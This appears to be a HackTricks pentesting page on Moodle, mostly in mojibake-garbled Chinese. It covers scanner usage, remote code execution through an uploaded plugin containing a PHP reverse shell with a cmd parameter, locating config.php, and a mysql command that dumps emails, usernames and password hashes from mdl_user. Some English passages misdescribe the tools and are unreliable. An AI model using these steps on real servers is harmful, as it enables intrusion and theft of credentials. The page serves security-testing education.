# Moodle

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ–è€… **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœä½ å¯¹**é»‘å®¢èŒä¸š**æ„Ÿå…´è¶£å¹¶ä¸”æƒ³è¦æ”»ç ´ä¸å¯æ”»ç ´çš„ç³»ç»Ÿ- **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼**ï¼ˆéœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­èƒ½åŠ›ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

## è‡ªåŠ¨æ‰«æ

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:
forum http://moodle.schooled.htb/moodle/mod/forum/
http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
3.10.0-beta

[+] Possible interesting urls found:
Static readme file. - http://moodle.schooled.htb/moodle/README.txt
Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan

moodlescan is a tool used for scanning and enumerating Moodle instances. It can be used to gather information about the Moodle installation, such as version, plugins, and themes. This information can be useful for identifying potential vulnerabilities and weaknesses in the Moodle system.

To use moodlescan, you need to provide the target Moodle URL. The tool will then perform various checks and scans to gather information about the Moodle instance. It will check for common vulnerabilities, such as SQL injection, cross-site scripting (XSS), and insecure file uploads.

moodlescan also has the ability to brute force user credentials, allowing you to test the strength of passwords used in the Moodle system. This can be useful for identifying weak passwords that could be easily compromised.

In addition to scanning for vulnerabilities, moodlescan can also be used to enumerate users, courses, and other information within the Moodle system. This can help in understanding the structure and organization of the Moodle instance.

Overall, moodlescan is a powerful tool for scanning and enumerating Moodle instances. It can help identify potential vulnerabilities and weaknesses in the system, allowing for better security and protection of Moodle installations.
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap

CMSMapæ˜¯ä¸€æ¬¾ç”¨äºæ‰«æå’Œè¯†åˆ«Moodleç½‘ç«™çš„å·¥å…·ã€‚å®ƒå¯ä»¥å¸®åŠ©ä½ å‘ç°Moodleç½‘ç«™çš„æ¼æ´å’Œå¼±ç‚¹ï¼Œä»¥ä¾¿è¿›è¡Œè¿›ä¸€æ­¥çš„æ¸—é€æµ‹è¯•ã€‚

#### å®‰è£…CMSMap

è¦å®‰è£…CMSMapï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
git clone https://github.com/Dionach/CMSmap.git
cd CMSmap
python3 cmsmap.py -h
```

#### ä½¿ç”¨CMSMap

ä½¿ç”¨CMSMapæ‰«æMoodleç½‘ç«™éå¸¸ç®€å•ã€‚åªéœ€è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
python3 cmsmap.py -t <target> -u <username> -p <password>
```

å…¶ä¸­ï¼Œ`<target>`æ˜¯ç›®æ ‡Moodleç½‘ç«™çš„URLï¼Œ`<username>`å’Œ`<password>`æ˜¯ç™»å½•Moodleç½‘ç«™æ‰€éœ€çš„å‡­æ®ã€‚

#### CMSMapåŠŸèƒ½

CMSMapå…·æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š

- æ‰«æMoodleç½‘ç«™çš„æ¼æ´å’Œå¼±ç‚¹
- å‘ç°Moodleç½‘ç«™çš„æ•æ„Ÿæ–‡ä»¶å’Œç›®å½•
- æ£€æµ‹Moodleç½‘ç«™çš„æ’ä»¶å’Œä¸»é¢˜
- æš´åŠ›ç ´è§£Moodleç½‘ç«™çš„ç™»å½•å‡­æ®
- æä¾›è¯¦ç»†çš„æ‰«ææŠ¥å‘Šå’Œç»“æœ

#### CMSMapç¤ºä¾‹

ä»¥ä¸‹æ˜¯ä½¿ç”¨CMSMapæ‰«æMoodleç½‘ç«™çš„ç¤ºä¾‹å‘½ä»¤ï¼š

```bash
python3 cmsmap.py -t https://example.com/moodle -u admin -p password123
```

è¿™å°†æ‰«æ`https://example.com/moodle`ç½‘ç«™ï¼Œå¹¶ä½¿ç”¨`admin`å’Œ`password123`ä½œä¸ºç™»å½•å‡­æ®ã€‚

#### æ³¨æ„äº‹é¡¹

åœ¨ä½¿ç”¨CMSMapè¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œè¯·ç¡®ä¿ä½ å·²ç»è·å¾—äº†åˆæ³•çš„æˆæƒï¼Œå¹¶ä¸”ä»…åœ¨åˆæ³•çš„ç¯å¢ƒä¸­ä½¿ç”¨ã€‚æ»¥ç”¨è¿™ä¸ªå·¥å…·å¯èƒ½ä¼šè¿åæ³•å¾‹è§„å®šï¼Œå¹¶å¯¹ä»–äººé€ æˆæŸå®³ã€‚
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

æˆ‘å‘ç°è‡ªåŠ¨åŒ–å·¥å…·åœ¨å‘ç°å½±å“ Moodle ç‰ˆæœ¬çš„æ¼æ´æ–¹é¢å‡ ä¹æ˜¯**æ— ç”¨çš„**ã€‚ä½ å¯ä»¥åœ¨ [https://snyk.io/vuln/composer:moodle%2Fmoodle](https://snyk.io/vuln/composer:moodle%2Fmoodle) ä¸Š**æ£€æŸ¥**å®ƒä»¬ã€‚

## **RCE**

ä½ éœ€è¦æ‹¥æœ‰**ç®¡ç†å‘˜**è§’è‰²ï¼Œå¹¶ä¸”ä½ å¯ä»¥åœ¨**"ç«™ç‚¹ç®¡ç†"**é€‰é¡¹å¡ä¸­**å®‰è£…æ’ä»¶**ï¼š

![](<../../.gitbook/assets/image (447).png>)

å¦‚æœä½ æ˜¯ç®¡ç†å‘˜ï¼Œä½ å¯èƒ½ä»ç„¶éœ€è¦**æ¿€æ´»æ­¤é€‰é¡¹**ã€‚ä½ å¯ä»¥åœ¨ Moodle ç‰¹æƒå‡çº§ PoC ä¸­æŸ¥çœ‹å¦‚ä½•æ¿€æ´»ï¼š[https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321)ã€‚

ç„¶åï¼Œä½ å¯ä»¥**å®‰è£…ä»¥ä¸‹åŒ…å«ç»å…¸ pentest-monkey php åå‘ shell çš„æ’ä»¶**ï¼ˆåœ¨ä¸Šä¼ ä¹‹å‰ï¼Œä½ éœ€è¦è§£å‹ç¼©å®ƒï¼Œæ›´æ”¹åå‘ shell çš„ IP å’Œç«¯å£ï¼Œç„¶åå†æ¬¡å‹ç¼©ï¼‰ï¼š

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨æ¥è‡ª [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE) çš„æ’ä»¶ï¼Œä»¥è·å–å¸¦æœ‰ "cmd" å‚æ•°çš„å¸¸è§„ PHP shellã€‚

è¦è®¿é—®å¯åŠ¨æ¶æ„æ’ä»¶ï¼Œä½ éœ€è¦è®¿é—®ï¼š
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### æŸ¥æ‰¾æ•°æ®åº“å‡­æ®

To find database credentials in a Moodle application, you can use the following steps:

1. Intercept the POST request using a proxy tool like Burp Suite.
2. Analyze the request parameters and look for any parameters related to database connection or credentials.
3. Look for parameters such as `dbhost`, `dbuser`, `dbpass`, `dbname`, or any other parameters that may indicate database credentials.
4. Extract the values of these parameters and note them down for further analysis.

By finding the database credentials, you can gain unauthorized access to the database and potentially extract sensitive information or perform other malicious activities. It is important to note that unauthorized access to databases is illegal and unethical. Always ensure you have proper authorization and follow ethical guidelines when performing any security testing or penetration testing activities.
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### ä»æ•°æ®åº“ä¸­è½¬å‚¨å‡­æ®

To dump credentials from a Moodle database, you can follow these steps:

1. Identify the database credentials: Locate the Moodle configuration file (`config.php`) which contains the database connection details. Look for the variables `$CFG->dbuser` and `$CFG->dbpass` to find the username and password.

2. Connect to the database: Use the obtained credentials to connect to the Moodle database. You can use tools like phpMyAdmin or command-line utilities like `mysql` to establish a connection.

3. Dump the credentials: Once connected to the database, you can execute SQL queries to extract the credentials. The table `mdl_user` usually stores user information, including usernames and hashed passwords. You can use a query like `SELECT username, password FROM mdl_user` to retrieve this information.

4. Decrypt the passwords (if necessary): If the passwords are stored in a hashed format, you may need to decrypt them using techniques like rainbow tables or brute-forcing. Tools like John the Ripper or Hashcat can be used for this purpose.

Remember to always perform these actions within the scope of a legal and authorized penetration testing engagement.
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœä½ å¯¹**é»‘å®¢èŒä¸š**æ„Ÿå…´è¶£å¹¶æƒ³è¦æ”»ç ´ä¸å¯æ”»ç ´çš„ä¸œè¥¿ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼**ï¼ˆéœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦é¢å’Œå£è¯­èƒ½åŠ›ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
